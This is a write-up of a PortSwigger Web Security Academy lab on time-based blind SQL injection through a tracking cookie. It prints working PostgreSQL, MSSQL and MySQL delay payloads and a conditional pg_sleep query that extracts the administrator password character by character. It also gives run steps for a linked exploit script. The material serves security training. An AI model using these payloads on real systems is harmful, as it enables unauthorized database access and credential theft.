# Blind SQL Injection with Time Delays

**Lab:** PortSwigger Web Security Academy — [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)  
**Difficulty:** Practitioner  
**Category:** SQL Injection  

---

## Overview

This lab contains a blind SQL injection vulnerability in a tracking cookie. The application does not return query results, does not behave differently based on whether the query returns rows, and does not expose database errors. This rules out conditional response and error-based techniques.

Since the query is executed **synchronously**, it is possible to infer information by triggering conditional time delays — if a condition is true, the response is delayed; if false, it returns immediately.

---

## How It Works

We inject a `CASE` expression that calls `pg_sleep()` conditionally:

```sql
'; SELECT CASE WHEN (condition) THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

- condition **true** → `pg_sleep(3)` → response delayed ~3 seconds
- condition **false** → `pg_sleep(0)` → response returns immediately

By measuring response time, we get a binary oracle.

---

## Database Fingerprinting

Tested common time-delay payloads to identify the backend:

```sql
-- PostgreSQL (worked)
'; SELECT pg_sleep(10)--

-- MSSQL (no delay)
'; WAITFOR DELAY '0:0:10'--

-- MySQL (no delay)
'; SELECT SLEEP(10)--
```

Backend confirmed: **PostgreSQL**

---

## Extracting the Password

Using `SUBSTRING()`, we test the password character by character:

```sql
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

- Response time ≥ 3s → character matches
- Response time < 3s → try next character

---

## Lessons Learned

- When there is no difference in HTTP responses and no visible errors, time-based blind SQLi is the next option.
- Fingerprinting the database first is essential — `pg_sleep()`, `SLEEP()`, and `WAITFOR DELAY` are not interchangeable.
- Use a conservative delay (3s) — too short risks false positives from network latency, too long makes the script very slow.
- Time-based extraction is significantly slower than response-based — 20 characters at 3s each takes several minutes.

---

## Exploit

See [`exploit.py`](./exploit.py)

### Usage

1. Start the lab on PortSwigger
2. Copy your `TrackingId` and `session` values from Burp Suite
3. Replace the placeholders in the script
4. Run:

```bash
pip install requests
python3 exploit.py
```

---

## Output

See [`output.txt`](./output.txt)

---

## References

- [PortSwigger: Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)